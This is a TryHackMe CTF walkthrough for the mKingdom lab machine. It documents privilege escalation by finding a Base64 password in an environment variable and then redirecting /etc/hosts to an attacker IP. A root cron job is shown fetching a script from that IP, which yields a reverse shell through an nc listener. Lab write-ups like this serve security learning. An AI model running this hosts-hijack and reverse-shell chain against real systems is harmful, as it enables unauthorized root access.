# TryHackMe mKingdom — CTF Walkthrough

**Platform:** TryHackMe  
**Machine:** mKingdom  
**Difficulty:** Easy  
**Initial User:** `toad`  
**Intermediate User:** `mario`  
**Final User:** `root`

> **Disclaimer:** This walkthrough documents my findings from an authorized TryHackMe lab. The initial-access exploit was not fully documented, so this write-up focuses on the privilege-escalation steps that were verified.

## 1. Initial Access

The target web application was accessible at:

```text
http://TARGET_IP:85/app/castle/
```

The application was running Concrete CMS 8.5.2.

Initial enumeration led to a shell as `toad`. The exact initial-access exploit was not recorded.

## 2. Enumerating the toad User

After obtaining the shell, I investigated the user's home directory for useful files and configuration information.

```bash
ls -la /home/toad
```

Notable files included:

- `smb.txt`
- `.mysql_history`
- `.ssh/`

The `.mysql_history` file contained database-related commands, including:

```sql
CREATE USER 'toad'@'localhost' IDENTIFIED BY 'toadisthebest';
GRANT ALL PRIVILEGES ON *.* TO 'toad'@'localhost' WITH GRANT OPTION;
```

The password `toadisthebest` was associated with the MySQL account `toad`. However, it was not the password that successfully switched to `mario`.

## 3. Finding the PWD_token Environment Variable

One important enumeration technique was inspecting environment variables.

```bash
env | grep PWD_token
```

This revealed the following Base64-encoded value:

```text
aWthVGVOVEFOdEtTCg==
```

### Decoding the value

I decoded it using:

```bash
echo 'aWthVGVOVEFOdEtTCg==' | base64 -d
```

The decoded output was:

```text
ikaTeNTANtKS
```

This value successfully worked as Mario's password in the challenge.

### Why this worked

Environment variables can contain configuration values, credentials, tokens, or clues accidentally exposed by an application or shell environment.

Base64 is an encoding format, not encryption. If a value is Base64-encoded, it can be decoded without a secret key.

Useful enumeration commands for similar authorized CTFs include:

```bash
env
```

```bash
env | grep -i 'token\|pass\|pwd\|secret'
```

These commands help identify potentially interesting variables. A suspicious variable name does not automatically mean its value is a password; the result must be investigated and verified.

## 4. Switching from toad to mario

I used the decoded value to switch users:

```bash
su mario
```

After entering the password, I verified the identity:

```bash
id
```

The observed identity was:

```text
uid=1001(mario) gid=1001(mario) groups=1001(mario)
```

This confirmed that the user transition succeeded.

## 5. Enumerating Mario's Sudo Permissions

Next, I checked the commands Mario could execute through `sudo`.

```bash
sudo -l
```

The relevant permission was:

```text
User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

This allowed Mario to execute `/usr/bin/id` with elevated privileges, but it did not directly provide an unrestricted root shell.

**Lesson:** Always inspect the exact executable and arguments permitted by a sudo rule. Not every sudo permission enables privilege escalation.

## 6. Investigating SUID Binaries

I enumerated SUID files:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

An unusual finding was:

```text
-rwsr-xr-x 1 toad root ... /bin/cat
```

The SUID bit causes an executable to run with the effective privileges associated with its file owner. In this case, `/bin/cat` was owned by `toad`, not `root`.

Therefore, this finding alone did not provide root privileges.

**Lesson:** Investigate unusual permissions carefully. File ownership and effective user IDs determine the actual security impact.

## 7. Discovering the Writable /etc/hosts File

I checked the permissions of `/etc/hosts`:

```bash
ls -l /etc/hosts
```

The observed permissions were:

```text
-rw-rw-r-- 1 root mario ... /etc/hosts
```

The file was owned by `root`, but its group was `mario`, and group members had write permission.

The existing hostname mapping was:

```text
127.0.1.1 mkingdom.thm
```

This was important because the target's scheduled task fetched a script using the hostname `mkingdom.thm`.

### Updating the hostname mapping

The Kali VPN IP observed during this session was:

```text
192.168.144.168
```

The following Python command updated the existing mapping:

```bash
python -c "p='/etc/hosts';s=open(p).read();s=s.replace('127.0.1.1\tmkingdom.thm','192.168.144.168\tmkingdom.thm');open(p,'w').write(s)"
```

I verified the change using:

```bash
getent hosts mkingdom.thm
```

The observed result was:

```text
192.168.144.168 mkingdom.thm
```

**Security lesson:** A writable hosts file can redirect hostname resolution. Its impact depends on whether a privileged process trusts the affected hostname.

## 8. Identifying the Root Script Fetch

The escalation path involved a root-level scheduled task that periodically fetched:

```text
http://mkingdom.thm:85/app/castle/application/counter.sh
```

The script was subsequently executed using Bash.

Although the scheduled task was not located in the standard cron directories during the initial checks, repeated HTTP requests confirmed that the target was fetching the expected path.

### Preparing the script directory on Kali

```bash
mkdir -p ~/mkingdom/app/castle/application
cd ~/mkingdom
```

I initially created a harmless test script:

```bash
printf '#!/bin/bash\necho "counter.sh request received"\n' > app/castle/application/counter.sh
```

I then started a Python HTTP server on port 85:

```bash
python3 -m http.server 85
```

### Verifying the requests

The server logs showed requests from the target:

```text
10.48.183.163 - - [26/Oct/2026 17:05:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
10.48.183.163 - - [26/Oct/2026 17:06:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
```

These requests occurred approximately once per minute.

A successful HTTP response alone does not prove code execution. However, the repeated requests established that the target was retrieving the expected script.

## 9. Obtaining Root Access

After confirming the scheduled fetch behavior, I replaced the test script with a reverse-shell callback for the authorized lab.

The callback used the Kali VPN IP and port `1234`.

A Netcat listener was started on Kali:

```bash
nc -lvnp 1234
```

The HTTP server was running separately:

```bash
cd ~/mkingdom
python3 -m http.server 85
```

The callback succeeded, providing a shell as `root`.

I verified the privileges with:

```bash
id
```

The observed result was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed root-level access.

## 10. Retrieving the Flags

The relevant flag paths were:

```text
/home/mario/user.txt
/root/root.txt
```

The actual flag values are intentionally omitted from this public write-up.

```text
user.txt: flag{userfla}
root.txt: flag{rootfla}
```

These are placeholders, not the actual TryHackMe flags.

## 11. Attack Chain Summary

```text
Concrete CMS 8.5.2
        |
        v
Initial shell as toad
        |
        v
Enumerate environment variables
        |
        v
Decode PWD_token using Base64
        |
        v
Switch to mario
        |
        v
Enumerate sudo permissions and file permissions
        |
        v
Discover writable /etc/hosts
        |
        v
Redirect mkingdom.thm to Kali VPN IP
        |
        v
Host counter.sh on port 85
        |
        v
Target's privileged scheduled task fetches the script
        |
        v
Receive root shell
        |
        v
Verify root privileges and retrieve flag files
```

## 12. Key Takeaways

1. Environment-variable enumeration can reveal credentials or useful challenge clues.
2. Base64 is encoding, not encryption.
3. Verify user transitions with `id`.
4. Read `sudo -l` carefully and evaluate the exact permitted command.
5. Inspect ownership and permissions when investigating SUID files.
6. Check whether system configuration files are writable by unprivileged users.
7. Determine which privileged processes rely on potentially modified configuration.
8. Use HTTP logs to verify that a target retrieves an expected resource.
9. Distinguish between successful downloads and actual script execution.
10. Never assume a privilege-escalation technique works without verifying its effects.

**Final note:** The initial-access exploit and the complete scheduled-task configuration were not fully documented in this session. They have therefore not been presented as verified findings.
